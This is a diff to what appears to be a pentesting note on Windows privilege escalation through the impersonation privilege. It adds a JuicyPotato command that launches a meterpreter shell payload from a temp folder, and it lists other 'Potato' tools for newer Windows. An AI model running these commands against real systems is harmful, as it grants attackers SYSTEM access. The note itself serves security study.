@@ -1,7 +1,5 @@
 This policy setting determines which programs are allowed to impersonate a user or another specified account and act on behalf of the user.
 
-Check `whoami /priv`:
-
 ```bash
 whoami /priv
 
@@ -39,7 +37,13 @@ whoami
 nt authority\system
 ```
 
-JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.
+Or a `meterpreter` shell:
+
+```bash
+.\JuicyPotato.exe -l 53375 -p c:\windows\temp\shell.exe -t * -c "{5B3E6773-3A99-4A3D-8096-7765DD11785C}"
+```
+
+`JuicyPotato` doesn't work on Windows Server 2019 and Windows 10 build 1809 onwards.
 
 Newer version of Windows, `PrintSpoofer/RougePotato/GodPotato` should work:
 
